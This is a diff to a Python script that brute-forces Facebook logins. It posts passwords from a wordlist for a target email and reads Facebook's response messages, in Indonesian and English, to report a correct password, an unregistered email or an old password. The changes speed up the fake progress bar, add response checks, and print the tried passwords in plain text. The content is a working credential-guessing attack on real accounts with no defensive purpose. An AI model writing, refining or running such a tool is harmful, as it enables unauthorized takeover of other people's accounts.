@@ -4,8 +4,8 @@ import time
 from bs4 import BeautifulSoup
 from colorama import Fore, init
 from termcolor import colored
+# init color print
 init()
-
 # Facebok Class
 class Facebook:
     # attribute
@@ -30,26 +30,26 @@ class Facebook:
             self.account['email'] = Email
             self.account['password'] = Password
             print(colored('Start Facebook Bruteforce', 'blue'))
-            print('.....5%')
-            time.sleep(1)
-            print('..........15%')
-            time.sleep(1)
-            print('...............25%')
-            time.sleep(1)
-            print('....................35%')
-            time.sleep(1)
-            print('.........................45%')
-            time.sleep(1)
-            print('..............................55%')
-            time.sleep(1)
-            print('...................................75%')
-            time.sleep(1)
-            print('........................................85%')
-            time.sleep(1)
-            print('.............................................90%')
-            time.sleep(1)
-            print('..................................................100%')
-            time.sleep(1)
+            print('....5%')
+            time.sleep(0.3)
+            print('........15%')
+            time.sleep(0.3)
+            print('.............25%')
+            time.sleep(0.3)
+            print('..................35%')
+            time.sleep(0.3)
+            print('.......................45%')
+            time.sleep(0.3)
+            print('............................55%')
+            time.sleep(0.3)
+            print('.................................75%')
+            time.sleep(0.3)
+            print('......................................85%')
+            time.sleep(0.3)
+            print('...........................................90%')
+            time.sleep(0.3)
+            print('..............................................100%')
+            time.sleep(0.3)
             print('')
         else:
             sys.exit()
@@ -76,15 +76,18 @@ class Facebook:
             self.payload['email']   = email
             self.payload['pass']    = password
             ReqPost = requests.post(self.url, data = self.payload, cookies = self.cookies, headers = self.headers)
-            if 'Aktivitas terbaru mungkin mempengaruhi keamanan akun Anda' in ReqPost.text or 'Recent activity might affect the security of your account' in ReqPost.text or 'Two-factor authentication required' in ReqPost.text or 'Harap Konfirmasikan Identitas Anda' in ReqPost.text:
+            # print(ReqPost.text)
+            if 'Aktivitas terbaru mungkin mempengaruhi keamanan akun Anda' in ReqPost.text or 'Recent activity might affect the security of your account' in ReqPost.text or 'Harap Konfirmasikan Identitas Anda' in ReqPost.text:
                 print('Message: Password Is : ', password)
                 sys.exit()
                 return True
-            if 'Email yang Anda masukkan tidak cocok dengan akun mana saja. Buat sebuah akun.' in ReqPost.text:
-                print('Message: Email Not Registry. Register Now In https://web.facebook.com/r.php')
+            if 'Email yang Anda masukkan tidak cocok dengan akun mana saja. Buat sebuah akun.' in ReqPost.text or "The email address that you've entered doesn't match any account. Sign up for an account." in ReqPost.text:
+                print(colored("Message: Email Not Registry. Register Now In https://web.facebook.com/r.php", "white", "on_red", attrs=["bold"]))
                 sys.exit()
-            if 'Permintaan Anda tidak dapat diproses' in ReqPost.text:
-                print(colored("Message: Sorry This Account Can't Be Process In Backend.", "white", "on_red", attrs=["bold"]))
+            if 'Ada masalah pada permintaan ini. Kami berusaha untuk menyelesaikannya dengan segera.' in ReqPost.text:
+                print(colored("Message: Account Can't Be Process In Backend.", "white", "on_red", attrs=["bold"]))
+            if  "You've entered an old password" in ReqPost.text:
+                print(colored("Message: Old Password.", "white", "on_blue", attrs=["bold"]))
             else:
                 return False
         # using txt file
@@ -93,7 +96,7 @@ class Facebook:
             i = 0
             for data in file:
                 i += 1
-                print('Password ' + str(i) + ' : ', hash(data))
+                print('Password ' + str(i) + ' : ', data)
                 postdata(self.account['email'], data)
         if(self.typeExec == 'manual'):
             # using password
